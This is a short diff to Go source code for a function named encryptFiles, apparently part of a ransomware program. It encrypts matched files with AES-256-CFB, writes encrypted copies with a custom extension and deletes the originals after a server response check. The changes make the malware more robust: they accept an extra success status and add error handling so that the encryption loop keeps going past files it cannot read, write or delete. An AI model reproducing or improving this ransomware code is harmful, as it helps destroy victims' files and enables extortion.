@@ -58,7 +58,7 @@ func encryptFiles() {
 
 		// handle possible response statuses
 		switch res.StatusCode {
-		case 204:
+		case 200, 204:
 			// \o/
 			break
 		case 409:
@@ -97,7 +97,12 @@ func encryptFiles() {
 		log.Printf("Encrypting %s...\n", path)
 
 		// Read the file content
-		text, _ := ioutil.ReadFile(path)
+		text, err := ioutil.ReadFile(path)
+		if err != nil {
+			// In case of error, continue to the next file
+			log.Println(err)
+			continue
+		}
 
 		// Encrypting using AES-256-CFB
 		ciphertext, err := crypto.Encrypt([]byte(keys["enckey"]), text)
@@ -108,10 +113,19 @@ func encryptFiles() {
 		}
 
 		// Write a new file with the encrypted content followed by the custom extension
-		ioutil.WriteFile(path+EncryptionExtension, ciphertext, 0600)
+		err = ioutil.WriteFile(path+EncryptionExtension, ciphertext, 0600)
+		if err != nil {
+			// In case of error, continue to the next file
+			log.Println(err)
+			continue
+		}
 
 		// Remove the original file
-		os.Remove(path)
+		err = os.Remove(path)
+		if err != nil {
+			// In case of error, continue to the next file
+			log.Println("Cannot delete original file, skipping...")
+		}
 	}
 
 	if len(MatchedFiles) > 0 {
